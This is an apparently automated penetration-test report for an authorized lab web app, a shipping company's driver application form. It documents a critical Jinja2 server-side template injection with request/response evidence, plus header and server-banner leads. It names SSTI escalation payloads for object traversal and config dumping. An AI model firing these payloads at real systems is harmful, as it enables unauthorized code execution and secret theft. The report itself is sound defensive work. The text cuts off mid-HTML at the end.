@@ -1,0 +1,459 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mr0h7q33-y2fvp9</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#b00020">CRITICAL</span> [ssti] Server-Side Template Injection (Jinja2) in driver application form 'name' field</a></li>
+</ul></li>
+<li><a href="#suspected">Suspected (needs manual verification)</a><ul>
+<li><a href="#finding-2">2. <span class="sev" style="color:#c9a227">LOW</span> [headers] Missing HTTP Security Headers</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#c9a227">LOW</span> [vulnerable-component] Werkzeug development server in production + verbose version banner (Werkzeug/3.1.8, Python/3.10.20)</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#5f7d8c">INFO</span> [info-disclosure] Server Version Disclosure via Server Header</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mr0h7q33-y2fvp9</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32794/</code></td></tr>
+<tr><td>Started</td><td>2026-06-30T10:00:47.302Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>4 mapped · 4 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>1</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32794</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>1 finding(s)</p><p class="sumtags"><span><b style="color:#b00020">1</b> critical</span></p>
+<p class="muted">Plus <b>3</b> suspected lead(s) needing manual verification (listed separately, not counted above).</p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 1. [ssti] Server-Side Template Injection (Jinja2) in driver application form 'name' field</h3>
+<div class="kv">Screen: <code>s-0003</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32794/</div>
+<div class="desc">The POST /submit handler renders the submitted 'name' value into a server-side Jinja2 template without sandboxing. A template expression supplied in the 'name' field is evaluated by the engine: name={{7*7}} returns &quot;Thank you 49&quot;, and name={{31337*1337}} returns &quot;Thank you 41897569&quot; (the computed product), while a benign value (name=John Doe) returns the literal string. The arithmetic is performed server-side, proving template-expression evaluation. This is Jinja2/Flask SSTI, which is RCE-class: an attacker can escalate from arithmetic to object traversal (e.g. {{config}}, {{''.__class__.__mro__[1].__subclasses__()}}) to read configuration/secrets and execute arbitrary OS commands on the server. The form is unauthenticated, so exploitation requires no credentials. Note: raw HTML in 'name' is autoescaped (&lt;b&gt; returned as &amp;lt;b&amp;gt;), so this is template injection, not reflected HTML XSS — autoescaping does not stop the engine from evaluating the expression first.</div>
+<div><b>Reproduction</b></div><pre>1. POST to http://target.local:32794/submit with Content-Type: application/x-www-form-urlencoded and body name={{31337*1337}}&amp;email=john@example.com&amp;phone=5551234567&amp;experience=5&amp;license=D1234567
+2. Response confirmation reads &quot;Thank you 41897569 for your submission.&quot; (31337 * 1337 = 41897569) — the expression was evaluated server-side.
+3. Negative control: body name=John Doe (no template) returns &quot;Thank you John Doe for your submission.&quot; — marker absent.
+4. Next-step PoC for impact: name={{config.items()}} or name={{self.__init__.__globals__}} to dump app config / reach os for command execution.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0hgjy5-5</code> — <code>artifacts/s-0003/ev-mr0hgjy5-5/</code></div><div class="lbl">REQUEST</div><pre>POST /submit HTTP/1.1
+Host: target.local:32794
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+name=John+Doe&amp;email=john%40example.com&amp;phone=5551234567&amp;experience=5&amp;license=D1234567</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1920
+content-type: text/html; charset=utf-8
+date: Tue, 30 Jun 2026 10:07:38 GMT
+server: Werkzeug/3.1.8 Python/3.10.20
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Swift Shipping &amp; Transport Inc.&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark&quot;&gt;
+        &lt;div class=&quot;container-fluid&quot;&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;/&quot;&gt;Swift Shipping &amp; Transport Inc.&lt;/a&gt;
+            &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNav&quot; aria-controls=&quot;navbarNav&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+            &lt;/button&gt;
+            &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarNav&quot;&gt;
+                &lt;ul class=&quot;navbar-nav&quot;&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/&quot;&gt;Home&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/about&quot;&gt;About Us&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/application&quot;&gt;Application Form&lt;/a&gt;
+                    &lt;/li&gt;
+                &lt;/ul&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+    &lt;div class=&quot;container mt-5&quot;&gt;
+        
+    &lt;div class=&quot;alert alert-success&quot; role=&quot;alert&quot; id=&quot;thankyou&quot;&gt;
+        Thank you John Doe for your submission.
+        &lt;br&gt;
+        We will contact you shortly.
+    &lt;/div&gt;
+
+    &lt;/div&gt;
+    &lt;footer class=&quot;bg-dark text-white text-center py-3 mt-5&quot;&gt;
+        &lt;p&gt;© 2024 Swift Shipping &amp; Transport Inc. All rights reserved.&lt;/p&gt;
+    &lt;/footer&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0hhwzy-e</code> — <code>artifacts/s-0003/ev-mr0hhwzy-e/</code></div><div class="lbl">REQUEST</div><pre>POST /submit HTTP/1.1
+Host: target.local:32794
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+name=%7B%7B31337*1337%7D%7D&amp;email=john%40example.com&amp;phone=5551234567&amp;experience=5&amp;license=D1234567</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1920
+content-type: text/html; charset=utf-8
+date: Tue, 30 Jun 2026 10:08:42 GMT
+server: Werkzeug/3.1.8 Python/3.10.20
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Swift Shipping &amp; Transport Inc.&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark&quot;&gt;
+        &lt;div class=&quot;container-fluid&quot;&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;/&quot;&gt;Swift Shipping &amp; Transport Inc.&lt;/a&gt;
+            &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNav&quot; aria-controls=&quot;navbarNav&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+            &lt;/button&gt;
+            &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarNav&quot;&gt;
+                &lt;ul class=&quot;navbar-nav&quot;&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/&quot;&gt;Home&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/about&quot;&gt;About Us&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/application&quot;&gt;Application Form&lt;/a&gt;
+                    &lt;/li&gt;
+                &lt;/ul&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+    &lt;div class=&quot;container mt-5&quot;&gt;
+        
+    &lt;div class=&quot;alert alert-success&quot; role=&quot;alert&quot; id=&quot;thankyou&quot;&gt;
+        Thank you 41897569 for your submission.
+        &lt;br&gt;
+        We will contact you shortly.
+    &lt;/div&gt;
+
+    &lt;/div&gt;
+    &lt;footer class=&quot;bg-dark text-white text-center py-3 mt-5&quot;&gt;
+        &lt;p&gt;© 2024 Swift Shipping &amp; Transport Inc. All rights reserved.&lt;/p&gt;
+    &lt;/footer&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0hhxz8-f</code> — <code>artifacts/s-0003/ev-mr0hhxz8-f/</code></div><div class="lbl">REQUEST</div><pre>POST /submit HTTP/1.1
+Host: target.local:32794
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+name=%7B%7B31337*1337%7D%7D&amp;email=john%40example.com&amp;phone=5551234567&amp;experience=5&amp;license=D1234567</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1920
+content-type: text/html; charset=utf-8
+date: Tue, 30 Jun 2026 10:08:43 GMT
+server: Werkzeug/3.1.8 Python/3.10.20
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Swift Shipping &amp; Transport Inc.&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark&quot;&gt;
+        &lt;div class=&quot;container-fluid&quot;&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;/&quot;&gt;Swift Shipping &amp; Transport Inc.&lt;/a&gt;
+            &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNav&quot; aria-controls=&quot;navbarNav&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+            &lt;/button&gt;
+            &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarNav&quot;&gt;
+                &lt;ul class=&quot;navbar-nav&quot;&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/&quot;&gt;Home&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/about&quot;&gt;About Us&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/application&quot;&gt;Application Form&lt;/a&gt;
+                    &lt;/li&gt;
+                &lt;/ul&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+    &lt;div class=&quot;container mt-5&quot;&gt;
+        
+    &lt;div class=&quot;alert alert-success&quot; role=&quot;alert&quot; id=&quot;thankyou&quot;&gt;
+        Thank you 41897569 for your submission.
+        &lt;br&gt;
+        We will contact you shortly.
+    &lt;/div&gt;
+
+    &lt;/div&gt;
+    &lt;footer class=&quot;bg-dark text-white text-center py-3 mt-5&quot;&gt;
+        &lt;p&gt;© 2024 Swift Shipping &amp; Transport Inc. All rights reserved.&lt;/p&gt;
+    &lt;/footer&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<h2 id="suspected">Suspected (needs manual verification)</h2>
+<p class="muted">Leads with one concrete anomaly but without control+2-replay confirmation — verify before relying on them.</p>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#c9a227">LOW</span> 2. [headers] Missing HTTP Security Headers</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32794/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> GET / returns only content-type header; no CSP, X-Frame-Options, X-Content-Type-Options, HSTS, or Referrer-Policy present across 3 independent requests — systematic header misconfiguration exposing users to clickjacking and content-injection without browser-level mitigations.</div>
+<div class="desc">The application returns responses with only a `Content-Type` header. Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, and Referrer-Policy are entirely absent across all observed responses.</div>
+<div><b>Reproduction</b></div><pre>1. Send GET / to http://target.local:32794/\n2. Inspect response headers — only `content-type: text/html; charset=utf-8` is present.\n3. Confirmed across 3 independent requests (ev-mr0hbo8z-1, ev-mr0hcxo2-2, ev-mr0hd0u7-3).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0hbo8z-1</code> — <code>artifacts/s-0001/ev-mr0hbo8z-1/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32794
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 3016
+content-type: text/html; charset=utf-8
+date: Tue, 30 Jun 2026 10:03:51 GMT
+server: Werkzeug/3.1.8 Python/3.10.20
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Swift Shipping &amp; Transport Inc.&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark&quot;&gt;
+        &lt;div class=&quot;container-fluid&quot;&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;/&quot;&gt;Swift Shipping &amp; Transport Inc.&lt;/a&gt;
+            &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNav&quot; aria-controls=&quot;navbarNav&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+            &lt;/button&gt;
+            &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarNav&quot;&gt;
+                &lt;ul class=&quot;navbar-nav&quot;&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/&quot;&gt;Home&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/about&quot;&gt;About Us&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/application&quot;&gt;Application Form&lt;/a&gt;
+                    &lt;/li&gt;
+                &lt;/ul&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+    &lt;div class=&quot;container mt-5&quot;&gt;
+        
+    &lt;div class=&quot;jumbotron text-center text-white py-5 position-relative&quot;&gt;
+        &lt;div class=&quot;overlay&quot;&gt;&lt;/div&gt;
+        &lt;div class=&quot;content position-relative&quot;&gt;
+            &lt;h1 class=&quot;display-4&quot;&gt;Welcome to Swift Shipping &amp; Transport Inc.&lt;/h1&gt;
+            &lt;p class=&quot;lead&quot;&gt;Your trusted partner in logistics and transportation.&lt;/p&gt;
+            &lt;a class=&quot;btn btn-light btn-lg&quot; href=&quot;/application&quot; role=&quot;button&quot;&gt;Apply Now&lt;/a&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+    &lt;div class=&quot;row mt-5&quot;&gt;
+        &lt;div class=&quot;col-md-4&quot;&gt;
+            &lt;img src=&quot;/static/images/featured1.jpg&quot; class=&quot;img-fluid rounded&quot; alt=&quot;Fleet Image&quot;&gt;
+            &lt;h3 class=&quot;mt-3&quot;&gt;Our Fleet&lt;/h3&gt;
+            &lt;p&gt;Explore our state-of-the-art fleet of trucks and vehicles.&lt;/p&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;col-md-4&quot;&gt;
+            &lt;img src=&quot;/static/images/featured2.jpg&quot; class=&quot;img-fluid rounded&quot; alt=&quot;Drivers Image&quot;&gt;
+            &lt;h3 class=&quot;mt-3&quot;&gt;Our Drivers&lt;/h3&gt;
+            &lt;p&gt;Meet our team of professional and dedicated drivers.&lt;/p&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;col-md-4&quot;&gt;
+            &lt;img src=&quot;/static/images/featured3.jpg&quot; class=&quot;img-fluid rounded&quot; alt=&quot;Safety Image&quot;&gt;
+            &lt;h3 class=&quot;mt-3&quot;&gt;Safety First&lt;/h3&gt;
+            &lt;p&gt;Learn about our commitment to safety on the road.&lt;/p&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;/div&gt;
+    &lt;footer class=&quot;bg-dark text-white text-center py-3 mt-5&quot;&gt;
+        &lt;p&gt;© 2024 Swift Shipping &amp; Transport Inc. All rights reserved.&lt;/p&gt;
+    &lt;/footer&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#c9a227">LOW</span> 3. [vulnerable-component] Werkzeug development server in production + verbose version banner (Werkzeug/3.1.8, Python/3.10.20)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32794/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> All responses carry `Server: Werkzeug/3.1.8 Python/3.10.20` — the signature of Flask's built-in Werkzeug development WSGI server (app.run()), which is explicitly not production-hardened, and the banner discloses the exact Werkzeug + Python patch versions for future CVE targeting. This is a real version/config-based lead from the banner, not yet exploited.</div>
+<div class="desc">Every response carries `Server: Werkzeug/3.1.8 Python/3.10.20`, the signature of Flask's built-in Werkzeug development WSGI server (app.run() / werkzeug.serving.run_simple), which the Werkzeug maintainers document as NOT for production: not designed to be efficient, stable, or secure, lacking the hardening of a real production stack (gunicorn/uWSGI behind nginx). Two concrete issues: (1) the banner discloses the exact Werkzeug and Python patch versions, narrowing future CVE targeting; (2) the dev server's main escalation path — the interactive debugger (debug=True) exposing a Python RCE console — was actively checked and is NOT enabled: a non-existent route returned the standard 207-byte Werkzeug production 404 with no traceback/console (evidence ev-mr0hsk6x-14), consistent with debug=False. VERSION/CONFIG-BASED, matched by banner — not exploited; logged as suspected for operator verification. CVE assessment: neither detected version has an applicable known CVE. Werkzeug 3.1.8 post-dates all notable Werkzeug CVEs (CVE-2024-34069 debugger RCE fixed 3.0.3; CVE-2024-49766/49767 fixed 3.0.6; CVE-2023-25577/23934 ≤2.2.3). Python 3.10.20 is a recent patch and Python 3.10 is not EOL until ~Oct 2026 (CVE-2024-9287/-7592/-6232/-8088 and CVE-2023-24329 all fixed well below .20). The actionable item is the dev-server-in-production posture + version disclosure, not an outdated-library CVE. Remediation: move behind a production WSGI server, suppress/normalize the Server header, keep debug mode off.</div>
+<div><b>Reproduction</b></div><pre>curl -i http://target.local:32794/  → observe `Server: Werkzeug/3.1.8 Python/3.10.20` (present on /, /about, /application, and error pages). Debugger-off check: curl -i http://target.local:32794/__nonexistent__trigger__ → standard 207-byte Werkzeug 404, no interactive traceback (debug=False), recorded as ev-mr0hsk6x-14.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0hsk6x-14</code> — <code>artifacts/_/ev-mr0hsk6x-14/</code></div><div class="lbl">REQUEST</div><pre>GET /__nonexistent__trigger__ HTTP/1.1
+Host: target.local:32794
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: close
+content-length: 207
+content-type: text/html; charset=utf-8
+date: Tue, 30 Jun 2026 10:16:59 GMT
+server: Werkzeug/3.1.8 Python/3.10.20
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#5f7d8c">INFO</span> 4. [info-disclosure] Server Version Disclosure via Server Header</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32794/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> fingerprint_scan detected `Server: Werkzeug/3.1.8 Python/3.10.20` in the response headers, exposing the exact framework and runtime versions. This enables targeted exploitation of version-specific CVEs in Werkzeug or Python 3.10.</div>
+<div class="desc">The HTTP Server response header exposes the exact versions of the underlying framework (Werkzeug 3.1.8) and Python runtime (3.10.20). Attackers can use this to identify version-specific known vulnerabilities without prior enumeration.</div>
+<div><b>Reproduction</b></div><pre>1. Send any HTTP request to http://target.local:32794/\n2. Inspect the Server response header: `Werkzeug/3.1.8 Python/3.10.20`.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0hbo8z-1</code> — <code>artifacts/s-0001/ev-mr0hbo8z-1/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32794
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 3016
+content-type: text/html; charset=utf-8
+date: Tue, 30 Jun 2026 10:03:51 GMT
+server: Werkzeug/3.1.8 Python/3.10.20
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Swift Shipping &amp; Transport Inc.&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark&quot;&gt;
+        &lt;div class=&quot;container-fluid&quot;&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;/&quot;&gt;Swift Shipping &amp; Transport Inc.&lt;/a&gt;
+            &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNav&quot; aria-controls=&quot;navbarNav&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+            &lt;/button&gt;
+            &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarNav&quot;&gt;
+                &lt;ul class=&quot;navbar-nav&quot;&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/&quot;&gt;Home&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
